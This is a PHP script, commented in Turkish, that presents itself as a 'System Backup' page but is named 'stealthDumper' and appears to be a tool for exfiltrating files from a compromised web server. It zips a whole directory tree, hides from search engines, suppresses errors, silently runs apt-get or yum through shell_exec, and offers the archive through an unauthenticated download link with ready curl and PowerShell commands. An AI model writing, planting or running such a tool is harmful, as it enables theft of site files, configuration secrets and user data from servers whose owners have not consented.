<?php
set_time_limit(0);
ignore_user_abort(true);
error_reporting(0);

$basePath = '/dumpalncak/dizinin/yolu';
$outputZip = $basePath . '/dump_' . date('Ymd_His') . '.zip';
$maxFileSize = 50 * 1024 * 1024; // 50MB limit sunucuyu çökertmemek için
$excludedExtensions = ['zip', 'rar', 'tar', 'gz', 'iso', 'mp4', 'avi']; // Büyük dosyaları bypass

class stealthDumper {
    private $zip;
    private $processedSize = 0;
    
    public function createDump($basePath, $outputZip, $maxSize, $excludedExts) {
        if (!extension_loaded('zip')) {
            $this->installZipExtension();
        }
        
        $this->zip = new ZipArchive();
        if ($this->zip->open($outputZip, ZipArchive::CREATE) !== TRUE) {
            return false;
        }
        
        $this->addDirectoryToZip($basePath, '', $maxSize, $excludedExts);
        $this->zip->close();
        
        return filesize($outputZip) > 0;
    }
    
    private function addDirectoryToZip($root, $relativePath, $maxSize, $excludedExts) {
        $fullPath = $root . ($relativePath ? '/' . $relativePath : '');
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($fullPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        
        foreach ($files as $file) {
            if ($this->processedSize >= $maxSize) break;
            
            $filePath = $file->getRealPath();
            $relativeFilePath = ($relativePath ? $relativePath . '/' : '') . $files->getSubPathName();
            
            // Büyük dosyaları ve belirli uzantıları atla
            $ext = strtolower(pathinfo($filePath, PATHINFO_EXTENSION));
            if (in_array($ext, $excludedExts) || filesize($filePath) > 10 * 1024 * 1024) {
                continue;
            }
            
            if ($file->isDir()) {
                $this->zip->addEmptyDir($relativeFilePath);
            } else {
                $this->zip->addFile($filePath, $relativeFilePath);
                $this->processedSize += filesize($filePath);
            }
        }
    }
    
    private function installZipExtension() {
        if (function_exists('shell_exec')) {
            @shell_exec('apt-get install -y php-zip 2>/dev/null || yum install -y php-zip 2>/dev/null');
            if (function_exists('dl')) {
                @dl('zip.so');
            }
        }
    }
}

// HTML arayüzü minimal
echo "<!DOCTYPE html><html><head><title>System Backup</title><meta name='robots' content='noindex,nofollow'></head><body style='font-family:monospace;background:#111;color:#0f0;'>";
echo "<h2>📦 Backup System</h2>";

if (isset($_GET['download'])) {
    $zipFile = basename($_GET['download']);
    $filePath = $basePath . '/' . $zipFile;
    
    if (file_exists($filePath)) {
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="' . $zipFile . '"');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    }
}

if (isset($_POST['start_dump'])) {
    $dumper = new stealthDumper();
    
    // Bellek limitini arttır ama sunucuyu çökertme
    ini_set('memory_limit', '512M');
    
    if ($dumper->createDump($basePath, $outputZip, $maxFileSize, $excludedExtensions)) {
        $fileSize = round(filesize($outputZip) / (1024 * 1024), 2);
        $fileName = basename($outputZip);
        $downloadUrl = $_SERVER['PHP_SELF'] . '?download=' . urlencode($fileName);
        
        echo "<div style='border:1px solid #0f0;padding:15px;margin:10px 0;'>";
        echo "✅ <strong>DUMP COMPLETED!</strong><br>";
        echo "📁 File: <code>$fileName</code><br>";
        echo "📦 Size: <strong>$fileSize MB</strong><br>";
        echo "🔗 Direct URL: <a href='$downloadUrl' style='color:#0ff;'>$downloadUrl</a><br>";
        echo "📋 Copy for wget: <code>wget \"" . htmlspecialchars($downloadUrl) . "\"</code><br>";
        echo "</div>";
    } else {
        echo "<div style='border:1px solid #f00;padding:15px;'>";
        echo "❌ Dump failed! Check permissions or ZIP extension.";
        echo "</div>";
    }
}

// Mevcut dump dosyalarını listele
$existingZips = glob($basePath . '/dump_*.zip');
if (!empty($existingZips)) {
    echo "<h3>📂 Existing Dumps:</h3><ul>";
    foreach ($existingZips as $zip) {
        $name = basename($zip);
        $size = round(filesize($zip) / (1024 * 1024), 2);
        $url = $_SERVER['PHP_SELF'] . '?download=' . urlencode($name);
        echo "<li><a href='$url'>$name</a> ($size MB)</li>";
    }
    echo "</ul>";
}

echo "<form method='POST' style='margin-top:20px;padding:15px;border:1px dashed #555;'>";
echo "<input type='submit' name='start_dump' value='🚀 START DUMP PROCESS' style='padding:10px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;'>";
echo "<br><small style='color:#888;'>Dosya boyutu 50MB ile sınırlıdır. Sunucu yükü minimize edilmiştir.</small>";
echo "</form>";

echo "<hr style='border-color:#333;'>";
echo "<h4>⚡ Quick Download Commands:</h4>";
echo "<pre style='background:#222;padding:10px;border-left:3px solid #0f0;'>";
echo "# Linux/Mac:\n";
echo "curl -O " . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/dump_*.zip\n\n";
echo "# Windows PowerShell:\n";
echo "Invoke-WebRequest -Uri \"" . (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']) . "/dump_*.zip\" -OutFile dump.zip";
echo "</pre>";

echo "</body></html>";
?>
